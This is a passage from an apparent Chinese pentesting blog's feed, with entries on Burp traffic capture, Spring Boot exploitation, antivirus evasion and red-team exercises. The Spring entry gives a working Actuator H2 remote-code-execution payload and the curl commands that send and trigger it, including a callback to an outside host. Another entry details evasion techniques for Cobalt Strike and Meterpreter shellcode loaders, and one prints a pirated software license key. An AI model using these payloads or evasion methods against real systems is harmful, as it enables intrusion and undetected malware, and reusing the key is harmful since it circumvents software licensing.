    <link href="https://askding.github.io/Kali/PostExploit/%E5%A6%82%E4%BD%95%E5%9C%A8mac%E4%B8%8A%E6%8A%93%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%B5%81%E9%87%8F.html"/>
    <id>https://askding.github.io/Kali/PostExploit/%E5%A6%82%E4%BD%95%E5%9C%A8mac%E4%B8%8A%E6%8A%93%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%B5%81%E9%87%8F.html</id>
    <published>2021-11-15T12:57:33.000Z</published>
    <updated>2021-11-15T12:57:33.000Z</updated>
    
    <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><h2 id="Burpsuite抓取微信小程序流量"><a href="#Burpsuite抓取微信小程序流量" class="headerlink" title="Burpsuite抓取微信小程序流量"></a>Burpsuite抓取微信小程序流量</h2><p>通过Proxifier工具代理微信小程序流量到Burp</p><ol><li>安装Burpsuite证书到macOS系统中</li></ol><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/202109291302084burp_cert.png"></p><ol start="2"><li>安装proxifier并添加Proxifier规则</li></ol><blockquote><p>Your name or company name:<br>macwk.com<br>Your registration key:<br>2DNRX-V3PNK-TEGYN-DR01D-9UGGT</p></blockquote><pre><code class="shell">brew install --cask proxifier</code></pre><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/202109291312960proxif_reg.png"></p><p>添加代理和配置代理规则</p><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/202109291359940proxi_prox.png"></p><blockquote><p>微信小程序路径 : /Applications/WeChat.app/Contents/MacOS/Mini Program.app</p></blockquote><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/202109291408305proxi_rule.png"></p><blockquote><p>⚠️ 先启动Proxifier，再启动Burpsuite，最后打开微信小程序,(最好关掉其他代理)</p></blockquote><p>抓包成功</p><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/202109291449850prox_burp.png"></p><p>存在其他代理(如clashX)时，Proxifier设置方法</p><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/202109291505365proxi.png"></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;编写进度&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;input checked=&quot;&quot; disabled=&quot;&quot; type=&quot;checkbox&quot;&gt; &lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;Burpsuite抓取微信小程序流量&quot;&gt;&lt;a href=&quot;#Burpsuite抓取微信小程序流量&quot; cl</summary>
      
    
    
    
    <category term="Kali" scheme="https://askding.github.io/categories/Kali/"/>
    
    <category term="PostExploit" scheme="https://askding.github.io/categories/Kali/PostExploit/"/>
    
    
  </entry>
  
  <entry>
    <title>Spring</title>
    <link href="https://askding.github.io/Kali/Exploit/Spring.html"/>
    <id>https://askding.github.io/Kali/Exploit/Spring.html</id>
    <published>2021-11-15T12:55:58.000Z</published>
    <updated>2021-11-15T12:55:58.000Z</updated>
    
    <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><p>推荐资料：</p><ul><li><a href="https://github.com/LandGrey/SpringBootVulExploit">SpringBootVulExploit</a></li><li><a href="https://misakikata.github.io/2020/04/Spring-%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/">Spring 框架漏洞集合</a></li><li><a href="https://www.cnblogs.com/cwkiller/p/12829974.html">Spring Boot Actuator H2 RCE复现</a></li></ul><ul><li><a href="https://www.jianshu.com/p/91a5ca9b7c1c">Spring Boot Actuator(eureka xstream deserialization RCE)</a></li></ul><p><strong>Spring</strong> 是为解决企业应用开发的复杂性而创建的一个开源框架。<br>    主要的设计思想是有两个：</p><ul><li><code>控制反转IOC</code><br>IOC是一种设计思想，将原本在程序中自己手动创建对象的控制权，交由 Spring 框架来管理。</li><li><code>面向方面编程AOP</code><br>利用一种称为”横切”的技术，剖解开封装的对象内部，并将那些影响了多个类的公共行为封装到一个可重用模块，并将其命名为”Aspect”，即切面。</li></ul><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><pre><code class="zsh">nmap -Pn -T4  -p 8080  -sV --version-all 192.168.79.28Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-15 17:18 CSTNmap scan report for 192.168.79.28Host is up (0.00019s latency).PORT     STATE SERVICE    VERSION8080/tcp open  http-proxy</code></pre><p>访问不存在的页面包含以下信息证明使用了Spring Boot</p><pre><code class="html">Whitelabel Error PageThis application has no explicit mapping for /error, so you are seeing this as a fallback.Tue Dec 15 09:35:57 GMT 2020There was an unexpected error (type=Not Found, status=404).No message available</code></pre><p>Spring API信息获取</p><pre><code class="zsh">curl -v &#39;http://192.168.79.28:8080/trace&#39;  # 获取用户认证字段curl -v &#39;http://192.168.79.28:8080/env&#39;    # 服务器配置信息，包括数据库curl -v &#39;http://192.168.79.28:8080/health&#39;  # 泄漏git项目地址curl -v &#39;http://192.168.79.28:8080/heapdump&#39; # 泄漏后台用户信息curl -v &#39;http://192.168.79.28:8080/&#39;curl -v &#39;http://192.168.79.28:8080/&#39;curl -v &#39;http://192.168.79.28:8080/&#39;curl -v &#39;http://192.168.79.28:8080/&#39;## Spring Boot Actuator H2 with HikariCP远程代码执行**Actuator** 是 Spring Boot 提供的用来对应用系统进行自省和监控的功能模块，借助于 Actuator 开发者可以很方便地对应用系统某些监控指标进行查看、统计等。  Actuator 配置不当导致应用系统监控信息泄露对应用系统及其用户的危害是巨大的更多[Spring Boot Rest API](https://howtodoinjava.com/spring-boot2/rest/rest-api-example/)```zsh curl  &#39;http://192.168.79.28:8080/actuator&#39;  # 查看actuator下的端点actuator/env&#123;&quot;_links&quot;:&#123;&quot;self&quot;:&#123;&quot;href&quot;:&quot;http://192.168.79.28:8080/actuator&quot;,&quot;templated&quot;:false&#125;,&quot;env-toMatch&quot;:&#123;&quot;href&quot;:&quot;http://192.168.79.28:8080/actuator/env/&#123;toMatch&#125;&quot;,&quot;templated&quot;:true&#125;,&quot;env&quot;:&#123;&quot;href&quot;:&quot;http://192.168.79.28:8080/actuator/env&quot;,&quot;templated&quot;:false&#125;,&quot;restart&quot;:&#123;&quot;href&quot;:&quot;http://192.168.79.28:8080/actuator/restart&quot;,&quot;templated&quot;:false&#125;&#125;&#125;%</code></pre><p>发送EXP</p><pre><code class="json">POST /actuator/env HTTP/1.1content-type: application/json&#123;&quot;name&quot;:&quot;spring.datasource.hikari.connection-test-query&quot;,&quot;value&quot;:&quot;CREATE ALIAS EXEC AS &#39;String shellexec(String cmd) throws java.io.IOException &#123; java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream());  if (s.hasNext()) &#123;return s.next();&#125; throw new IllegalArgumentException();&#125;&#39;; CALL EXEC(&#39;/Applications/Calculator.app/Contents/MacOS/Calculator&#39;);&quot;&#125;POST /actuator/restart HTTP/1.1content-type: application/json&#123;&#125;</code></pre><pre><code class="zsh">curl -X &#39;POST&#39; -H &#39;Content-Type: application/json&#39; --data-binary $&#39;&#123;\&quot;name\&quot;:\&quot;spring.datasource.hikari.connection-test-query\&quot;,\&quot;value\&quot;:\&quot;CREATE ALIAS EXEC AS CONCAT(\&#39;String shellexec(String cmd) throws java.io.IOException &#123; java.util.Scanner s = new\&#39;,\&#39; java.util.Scanner(Runtime.getRun\&#39;,\&#39;time().exec(cmd).getInputStream()); if (s.hasNext()) &#123;return s.next();&#125; throw new IllegalArgumentException(); &#125;\&#39;);CALL EXEC(\&#39;curl http://x.burpcollaborator.net\&#39;);\&quot;&#125;&#39; &#39;http://192.168.79.28:8080/actuator/env&#39;#发送expcurl -X &#39;POST&#39; -H &#39;Content-Type: application/json&#39; &#39;http://192.168.79.28:8080/actuator/restart&#39;   # 触发exp</code></pre><h3 id="安全措施"><a href="#安全措施" class="headerlink" title="安全措施"></a>安全措施</h3><ol><li>引入 security 依赖，打开安全限制并进行身份验证</li><li>设置单独的 Actuator 管理端口并配置不对外网开放</li></ol><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;编写进度&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;input checked=&quot;&quot; disabled=&quot;&quot; type=&quot;checkbox&quot;&gt; &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;推荐资料：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/LandGrey/S</summary>
      
    
    
    
    <category term="Kali" scheme="https://askding.github.io/categories/Kali/"/>
    
    <category term="Exploit" scheme="https://askding.github.io/categories/Kali/Exploit/"/>
    
    
  </entry>
  
  <entry>
    <title>免杀思路</title>
    <link href="https://askding.github.io/Kali/PostExploit/%E5%85%8D%E6%9D%80%E6%80%9D%E8%B7%AF.html"/>
    <id>https://askding.github.io/Kali/PostExploit/%E5%85%8D%E6%9D%80%E6%80%9D%E8%B7%AF.html</id>
    <published>2021-09-25T06:06:46.000Z</published>
    <updated>2021-09-25T06:06:46.000Z</updated>
    
    <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><h2 id="杀毒软件常见检测方法："><a href="#杀毒软件常见检测方法：" class="headerlink" title="杀毒软件常见检测方法："></a>杀毒软件常见检测方法：</h2><p>通常分为静态特征查杀和动态行为检测(包括沙箱)</p><ul><li><p>静态特征查杀，基于匹配特征码，与病毒库里面的md5进行比较。</p><pre><code> 做法：模糊哈希算法，机器学习跑模型 ， </code></pre><p>绕过：利用myccl工具查找定位复合特征码 或手工（单步查杀找到特征码）对特征码进行混淆处理</p></li><li><p>动态行为检测 ，沙箱执行可以程序 </p><pre><code> 做法：hook关键api，监控注册表启动项，系统文件，防止对其修改    绕过： 沙箱检测(检测线程数)，文件重命名检测 延时(类似cobaltstrike的睡眠机制，用钩子在睡眠时间内存权限设置读写，在非睡眠时改回可执行。)</code></pre></li></ul><h2 id="熟悉各个杀软的查杀特性"><a href="#熟悉各个杀软的查杀特性" class="headerlink" title="熟悉各个杀软的查杀特性"></a>熟悉各个杀软的查杀特性</h2><ul><li><p>火绒： 重点基于字符串去查杀，<br>做法：重点针对函数如regMovememory进行字符串混淆或更换函数</p></li><li><p>360： 重点基于函数具体触发的行为去查杀 <br>做法： 延时，沙箱检测，文件重命名检测</p></li><li><p>WinDefender： 重点基于特定位置，特征码去查杀   <br>做法：找特征码去混淆</p></li></ul><h2 id="针对各个杀软的特点进行自定义加载器"><a href="#针对各个杀软的特点进行自定义加载器" class="headerlink" title="针对各个杀软的特点进行自定义加载器"></a>针对各个杀软的特点进行自定义加载器</h2><p>免杀处理思路：</p><ol><li><p>源码免杀，（有源码时） 定位特征码，进行混淆<br>a)如内嵌汇编加载、内存免杀(渐进式申请一块内存，最后改为可执行)、分离免杀、二次编译、<br>b)隐藏IAT、强制类型转换、加花指令、多层跳转、加无效指令、替换/重写API、API伪调用等<br>c)shellcode进行异或 编码base64，AES加密等 </p></li><li><p>无源码免杀，在源码不好修改时，<br>a)resourceHacker资源修改、<br>b)vmp加壳、加签名、PE优化等组合使用</p></li><li><p>白名单exe/dll免杀-如rundll32、msbuild、mshta、cscript等</p></li><li><p>Powershell混淆绕过  – 根据powershell语言特性，字符串转换，变量转换，编码，压缩等</p></li><li><p>偏僻语言编写shellcode</p></li><li><p>加载器分离免杀</p></li></ol><h2 id="简述远程加载器分离免杀的思路比较好，实现代码逻辑"><a href="#简述远程加载器分离免杀的思路比较好，实现代码逻辑" class="headerlink" title="简述远程加载器分离免杀的思路比较好，实现代码逻辑"></a>简述远程加载器分离免杀的思路比较好，实现代码逻辑</h2><p>  规避网络测绘-&gt;shellcode混淆-&gt;beacon去特征<br>大体思路：<br>Winhttp库或window sockets实现http请求（cs使用winInet库） –&gt; 存在问题：容易暴露自己C2和文件服务器地址(域前置解决)<br>对shellcode进行AES动态加密</p><ul><li>服务器<br>用netty框架，采用select多客户端模型 写一个web服务器，获取请求发过来的key值，用key对shellcode进行加密，响应给客户端</li><li>客户端（C++加载器）</li></ul><ol><li>每次请求shellcode时随机生成一个key值，通过http请求将key发送到服务器</li><li>服务器使用key对shellcode进行AES加密或shellcode每一位与key进行异或操作，响应给客户端</li><li>用cryptopp库进行AES解密shellcode，virtualAlloc采用渐进式申请内存空间，使用memcpy拷贝shellcode到内存中，最后调用这个内存地址</li></ol><p>甚至可以将loader是否也可以尝试一下，客户端仅保留下载loader和shellcode的功能</p><p>shellcode生成工具-donut，对Execute-Assembly进一步利用，将exe,dll,vbs,js转成shellcode<br>shellcode混淆器-Obfuscator<br>修改加载器特征<br>加载器特征= A「shellcode+硬编码字符串」 + B 「virtualAlloc，virtualProtect函数」</p><p>修改方法：<br>          对A进行 base64编码+加密（如xor）(更安全)，   <br>         对B插入花指令(无意义代码)， 可以使用HeapAlloc替换virtualAlloc函数<br>修改加载器的特征</p><p>对<code>func_get_delegate_type</code>，<code>func_get_proc_address</code>两个函数重命名替换，对函数里面的一些变量进行重新定义</p><h3 id="分离免杀"><a href="#分离免杀" class="headerlink" title="分离免杀"></a>分离免杀</h3><p>shellcode加载器=S_0「shellcode_downloader」+ S_1「donwlod+run_shellcode」<br>通常杀软只检测一个进程的行为，<br>做法： 使用windows管道，socket通道<br>分离免杀，将shellcode写入到文件中和加载器分离开，在加载器启动执行时再将shellcode从文件当中读取进来。</p><h3 id="修改资源"><a href="#修改资源" class="headerlink" title="修改资源"></a>修改资源</h3><p>杀软会检测文件的描述，版本号，创建日期作为特征检测<br>做法： 使用restorator对目标修改资源文件</p><h3 id="隐藏IAT"><a href="#隐藏IAT" class="headerlink" title="隐藏IAT"></a>隐藏IAT</h3><p>杀软检测导入表中是否存在可疑函数<br>做法： opt1 调用getProcessAddress获取所需函数地址<br>opt2  用汇编从Teb里找到kernel32.dll地址，再从其导出表中获取所需系统函数</p><h2 id="msf与cs的stager对比分析"><a href="#msf与cs的stager对比分析" class="headerlink" title="msf与cs的stager对比分析"></a>msf与cs的stager对比分析</h2><p>  相同点： 通过WinInet系列函数远程加载stage并使用VirtualAlloc为其分配一块rwx的内存空间，最后转去执行stage<br>  不同点： cs比msf多调用几个函数 InternetErrorDlg, GetDesktopWindow, GetLastError</p><h3 id="payload加载方式基本一致-cs参考msf，都支持stager和stageless方式加载"><a href="#payload加载方式基本一致-cs参考msf，都支持stager和stageless方式加载" class="headerlink" title="payload加载方式基本一致(cs参考msf，都支持stager和stageless方式加载)"></a>payload加载方式基本一致(cs参考msf，都支持stager和stageless方式加载)</h3><p>meterpreter加载顺序：stager-&gt;metsrv.dll-&gt;stdapi.dll<br>           cs-beacon加载顺序： stgaer-&gt;beacon.dll</p><h3 id="C2实现方式："><a href="#C2实现方式：" class="headerlink" title="C2实现方式："></a>C2实现方式：</h3><pre><code>   meterpreter的handler实现：TCPServer结合resources实现的简易HTTP服务   Beacon的Listener实现：基于NanoHTTPD实现(成熟稳定)</code></pre><h3 id="通信协议上差异："><a href="#通信协议上差异：" class="headerlink" title="通信协议上差异："></a>通信协议上差异：</h3><pre><code>cs和msf均使用http/s进行数据通信，但具体传输方式上有差异    meterpreter使用HTTP 1.1 ，默认使用keep-alive功能，且不能关闭 （不稳定）    Beacon使用HTTP 1.1 ，但默认不开启keep-alive功能 且支持抖动特性</code></pre><p>具体的表现为在实际使用过程中,Meterpreter与C2服务器始终保持一条TCP连接,且对TCP连接的状态没有监控. 相对应的Beacon在请求任务/返回结果时会与C2建立连接,而在sleep阶段与C2没有网络连接. </p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;编写进度&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;input checked=&quot;&quot; disabled=&quot;&quot; type=&quot;checkbox&quot;&gt; &lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;杀毒软件常见检测方法：&quot;&gt;&lt;a href=&quot;#杀毒软件常见检测方法：&quot; class=&quot;headerlin</summary>
      
    
    
    
    <category term="Kali" scheme="https://askding.github.io/categories/Kali/"/>
    
    <category term="PostExploit" scheme="https://askding.github.io/categories/Kali/PostExploit/"/>
    
    
  </entry>
  
  <entry>
    <title>红蓝对抗</title>
    <link href="https://askding.github.io/Kali/PostExploit/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97.html"/>
    <id>https://askding.github.io/Kali/PostExploit/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97.html</id>
    <published>2021-09-23T02:37:34.000Z</published>
    <updated>2021-09-23T02:37:34.000Z</updated>
    
    <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><ul><li>红蓝对抗<br>组织 <em>多支攻击队伍</em>  对 <em>各行业重点点位目标系统</em> 进行集中攻击，检验防守方的防护能力，通过预判的规则，以积分形式确定双方的排名。</li></ul><ul><li><p>攻击者(经授权的国家科研机构、安全公司/团队)</p></li><li><p>防守方(系统运营单位、其他协同防护主体)</p></li><li><p>裁判组(组织方、第三方权威机构)</p></li><li><p><input disabled="" type="checkbox">  得分场景</p><ol><li>积极配合应急组工作，根据线索能快速准确定位受害系统，能提供充分的日志记录，配合执法机关固定证据完成勘验发现木马攻击</li><li>发现漏洞攻击，记录完整的攻击路径，并需触发响应的应急处置流程</li><li>处置Webshell木马或主机木马程序，并需触发响应的应急处置流程</li><li>处置主机异常新增账户，处置被爆破账户密码，并需触发响应的应急处置流程</li><li>处置Web系统、FTP等异常新增账户，处置被爆破账户密码消除其他威胁</li><li>发现钓鱼攻击，快速定位钓鱼样本，并提交样本分析报告</li><li>发现社会工程攻击，上报攻击者有效个人信息(职位、姓名、电话、公司)等</li><li>发现并成功溯源攻击者，上报攻击者有效信息(IP、设备信息、个人信息)</li><li>发现并成功反制攻击者，控制攻击者主机及网络环境</li></ol></li><li><p><input disabled="" type="checkbox">  失分场景</p><ol><li>被获取域控服务器权限</li><li>被获取路由器、交换机、防火墙等网络设备权限</li><li>被获取Web应用系统服务器、邮件服务器、数据库服务器等权限</li><li>被获取业务内网邮箱、FTP应用、Web应用系统、数据库远程访问、互联网VPN接入系统的账户密码</li><li>被获取Webshell权限</li><li>被获取终端计算机权限</li><li>被获取其他设备权限</li></ol></li></ul><p>** 攻击队<br>基本攻击思路</p><ol><li>主要资产正面突破<br>此路径系统漏洞相对较少，防护设备与安全措施相对更严密，攻击难度大且易被察觉，但由于资产重要程度较高，有所突破能有较大收益</li><li>边缘资产迂回突破<br>此处防御相对薄弱，监控缺失，攻击难度较小，但若要进一步入侵核心层，往往还需要多次横向和纵向的扩展</li><li>第三方侧面入侵<br>利用上下游公司、外包开发商等与企业的网络具有关联性的机构，攻击者可通过首先入侵第三方，再扩展到企业，从而达到侧面入侵的目的</li><li>以人为突破口<br>瞄准安全意识薄弱的员工进行钓鱼等社工，可以广撒网，也可以精准打击运维等具有管理权限的员工</li><li>利用联网的硬件入侵<br>通过联网的设备，利用网络互联、隔离不够等防护脆弱点，实现目标的迂回攻击</li></ol><p>*** 初始信息收集<br>攻击者搜集关于目标组织的人员信息、组织架构、网络资产、技术框架及安全措施信息，后期这些信息将为攻击决策提供支撑。<br>收集信息的种类报告但不限于分支机构、关联公司、外包公司、投资公司、人员、网络、主机、域名、账户、邮箱等信息。<br>可进行收集信息的公开渠道：</p><p>| 天眼查 | 企查查 | 搜索引擎 | 社交网络  | ICP备案库 | 社工库  |<br>| Fofa   | Shodan | 官网     | 主/子域名 | BGP归属   | Zoomeye |</p><p>自动化工具常用来实现对攻击目标资产的持续跟踪，并对临时增加的资产，进行蜜罐识别探测<br>识别资产指纹，记录攻击目标资产的更详细类型，如CMS、第三方系统、组件、中间件等，以便对应到可进行利用的漏洞<br>收集攻击目标所涉及核心人员的全面信息，包括线上、社工，钓鱼等</p><p>通过自动化工具结合人工操作，持续进行信息搜集和扫描查点工作，长用手段:<br>| 高频探测     | 口令爆破、重放攻击、爬虫扫描、信息抓取 |<br>|————–+—————————————-|<br>| 敏感文件探测 | SVN泄露、Git泄露、备份文件泄露         |<br>| 敏感端口探测 | 22、3306、7001、6379、8080等           |<br>| 敏感路径探测 | 网站后台、未授权页面                   |<br>| 信息劫持攻击 | 中间人劫持、DNS劫持                    |</p><p>*** 选择攻击方案<br>对基础信息进行分析后，确认出关键任务，关键系统，边缘系统，物理地址等信息，攻击成员分工领取攻击任务，<br>方案包括：物理入侵、钓鱼邮件、Wi-Fi入侵、边缘资产渗透、互联网边界突破</p><p>*** 初始入侵<br>利用搜集到的信息，自动化攻击工具、漏洞储备资源、计算资源能力，通过利用安全意识漏洞、Nday和0day进行攻击，突破到内网区域<br>一般会先采用自动化工具进行第一波突破，若无果，再采用遍历攻击面的方式，逐个系统人工深入挖掘漏洞。</p><p>WAF对抗/IPS对抗  –&gt; EDR绕过/补丁绕过  –&gt; 漏洞利用/Webshell</p><ul><li>扫描器产出漏洞深入利用</li><li>利用员工账户爆破VPN系统</li><li>上传Webshell进一步获取控制权</li><li>OA系统/邮箱/VPN人工尝试登陆</li><li>尝试绕过WAF利用漏洞</li><li>人工注册业务系统账号挖掘漏洞</li></ul><p>*** 站稳脚跟<br>通过特定的工具，利用初始入侵得到的突破口，建立好进入内网的通道，同时做好隐蔽防止被发现，能稳定在内网立足</p><p> 通过虚拟机攻击云管理平台，利用管理平台控制所有机器<br>通过直接从虚拟机进行逃逸，从而控制宿主机，然后利用宿主机控制其上所有虚拟机</p><p>*** 权限提升<br>通过内核提权、不安全服务等各类手段，将攻击者的权限进行一定的提升，甚至到最高权限，一边进一步操作</p><p>*** 内部信息收集<br>利用新的立足点，进行内网的信息收集，包括内网的网络结构，脆弱服务，用户账户密码等，为下一步行动做准备</p><p>*** 横向移动<br>结合之前搜集的信息，在通过特定漏洞和工具进行横向移动，扩展到新的位置。<br>定向攻击核心目标，通过内网横向渗透，获取到更多的服务器控制权，更多的管理员信息，更多人的密码。<br>如DevOps发布系统，Jenkins/Git/SVN代码仓库、堡垒机、跳板机、开发运维、开发环境权限</p><p>*** 权限维持<br>扩展到新位置后，利用工具稳定攻击者权限，使能够立足在内网新位置</p><p>   *** 完成目标<br>通过不断的权限提升-内部信息收集-横向移动-维持权限这个循环，逐步靠近目标，最终完成目标</p><p>** 防守队</p><p>P2DR模型：是机遇策略的模型</p><ul><li><p>Policy: 策略是模型的核心，所有的防护、检测和响应都是依据安全策略实施的</p></li><li><p>Protection: 防护是根据系统可能出现的安全问题而采取的预防措施。采用的防护技术包括数据加密、身份认证、访问控制、授权和VPN技术、防火墙、安全扫描和数据备份等</p></li><li><p>Detection: 当攻击者穿越防护系统时，检测功能就发挥作用，与防护系统形成互补，检测是动态响应的依据</p></li><li><p>Response: 系统一旦检测到入侵，响应系统就开始工作，进行事件处理。</p></li><li><p>重点： 预防<br>尽可能全面理清攻击面、清理外网泄露的敏感信息，同时对资产进行相关的测试及加固</p></li><li><p>基础：检测与监测<br>明晰内外部资产状态，通过各类检测、监测的安全设备实时发现攻击痕迹，快速定位，为后续响应及溯源提供信息和证据</p></li><li><p>狙击手段：响应<br>建立完善的应急响应流程，<br>快速判断及处理未成功攻击，极致运用自动化体系减少防守人员的精力消耗<br>准备常见应急方案，快速联动处理突发情况，做到快速发现、定位分析、响应处置</p></li><li><p>得分手段：溯源<br>利用技术手段还原攻击者攻击首发，定位身份<br>通过攻击中暴漏的IP/域名或其他信息，结合威胁情报及相关渠道还原其画像，追溯到真人<br>通过部署内外网蜜罐等手段，主动诱捕在进行信息搜集/打算入侵的攻击者</p></li></ul><p>*** 常态化资产安全管理</p><ol><li><p>互联网资产测绘与检测<br>对互联网资产暴露面、互联网敏感信息泄露、互联网暴露的高危漏洞、端口和弱口令进行全面检测，并提供应急响应漏洞通告，帮助企业全面梳理互联网资产暴露风险</p></li><li><p>借助资产管理功能的安全产品<br>资产安全管理平台、主机安全管理平台</p></li><li><p>人工盘点、跟踪、核查与确认<br>梳理防火墙配置、回收老旧资产、登记新上资产<br>对主要供应链进行梳理如VPN品牌、OA/邮件供应商、系统框架组件</p></li><li><p>效果：<br>发现异常IP告警：5mins内，定位到该IP对应的资产在网络位置及物理位置，并可在技术上完成资产封堵<br>新爆发0day： 5mins内排查影响，定位受影响的资产并实施封堵</p></li></ol><p>重大保障期间：加强对互联网暴露资产进行周期性安全巡检:<br>；| 检查项                 | 内容                                                                               |<br>|————————+————————————————————————————|<br>| 互联网暴露面资产巡检   | 建立完整的互联网暴露面资产地图，包括外网全量自域名、外网全量端口指纹、外网Web指纹  |<br>| 互联网敏感信息监控     | 定期扫描企业在Github、码云、百度文库等高风险暴露渠道的信息泄露风险                 |<br>| 高危端口弱口令周期扫描 | 基于企业特点定制化弱口令集，对高危端口(SSH、MySQL、RDP、MSSQL等)进行周期弱口令探测 |<br>| 常见高危漏洞周期扫描   | 对常见高危漏洞进行周期扫描                                                         |<br>| 应急漏洞响应通告       | 结合企业暴露面资产指纹，获取互联网新增高危应急漏洞、云上捕获等情报                 |</p><ul><li>防守工作最佳实战指南</li></ul><p>** 全面检测<br>*** 网络架构分析<br>主要针对企业网络拓扑结构、安全域划分、网络访问控制规则、网络攻击路径进行调研和分析存在的网络安全问题，明确网络安全现状、为后期测试、防护加固提供方向</p><p>| 任务             | 工作内容                                                                                                         |<br>|——————+——————————————————————————————————————|<br>| 网络拓扑结构     | 通过访谈调研与工具探测，分析服务器、安全设备、网络设备、IP地址之前的关系，绘制网络拓扑                           |<br>| 安全域划分       | 根据企业拓扑结构及人员访谈，明确安全域的名称及作用、访问控制策略、安全管理措施                                   |<br>| 网络访问控制规则 | 明确域间及域内访问控制关系，梳理防火墙ACL列表及NAT列表｜                                                         |<br>| 网络攻击路径分析 | 基于实战经验梳理常见网络攻击路径，梳理内、外网易受攻击资产，互联网纵向攻击、内部网络横向攻击、集权类系统风险评估 |<br>| 入侵防护分析     | 根据网络拓扑及攻击面，梳理入侵防护现状、安全措施、安全设备覆盖度                                                 |</p><p>*** 资产梳理<br>开展资产梳理工作最好从</p><ul><li>调研[fn::人工进行访谈、调研、不间断判断、跟踪、核查与确认，确保防火墙配置、回收老旧资产、登记新资产等信息]</li><li>工具检索[fn:: 使用网络扫描等手段进行资产测绘]</li></ul><p>| 任务 | 工作内容                                                                                                                 |<br>|——+————————————————————————————————————————–|<br>| 区域 | 互联网区、办公区、生产区、开发测试区、大数据区、外联区                                                                   |<br>| 范围 | 业务系统、应用系统、办公系统、数据库、中间件、服务器、存储设备、网络设备、安全设备、网络拓扑结构                         |<br>| 纬度 | IP、域名、开放端口、服务、编号、用途、版本、型号、数据、操作系统、使用状态、账户、弱口令、通信方式、资产负责人、联系方式 |</p><p>未知资产： 企业内未确认归属、违规对互联网开放的资产,包括：</p><ul><li>公网IP地址</li><li>端口服务</li><li>Web应用</li><li>管理后台等</li></ul><p>*** 安全意识培训</p><p>| 层面       | 内容                                                         |<br>|————+————————————————————–|<br>| 政策背景   | 攻防演练活动国家、行业政策、验证体系介绍、攻防演练活动发展史 |<br>| 行业事件   | 行业内发生的安全事件解读、安全事件总结与防范措施建议         |<br>| 演练必要性 | 安全威胁演变趋势及影响，攻防演练行动解决的问题及收益         |</p><p>*** 基线评估</p><ul><li>内网基线评估 ：内网基线配置检查、漏洞扫描以内网基线扫描和应用及系统升级为主</li><li>外网基线评估 ：外网基线配置检查、漏洞扫描以Web安全基线，和Web漏洞为主</li></ul><p>*** 渗透测试</p><ol><li>内网渗透测试 ： 针对靶标系统、业务系统、域控、集中管控平台进行渗透测试</li><li>外网渗透测试 ： 针对所有暴露于互联网的应用和主机进行渗透测试</li></ol><ul><li><p>Web服务安全检测：<br>对支持Web业务稳定运行的服务进行安全检测，包括常见系统服务、常见容器组件、业务框架、业务相关支撑系统，<br>如SSH、RDP、FTP、数据库等服务，Weblogic、Tomcat、Jboss、Websphere容器、Structs2、Spring、ThinkPHP框架，<br>常见的检测项如弱口令检测、安全性配置测试、系统/服务版本检测、后门检测与排查</p></li><li><p>Web应用安全检测：<br>对被测业务功能进行安全检测，包括SQL注入、代码注入、XSS、CSRF、SSRF、XXE、越权、逻辑漏洞、文件包含、文件上传、任意文件读取、验证码安全等</p></li></ul><p>*** 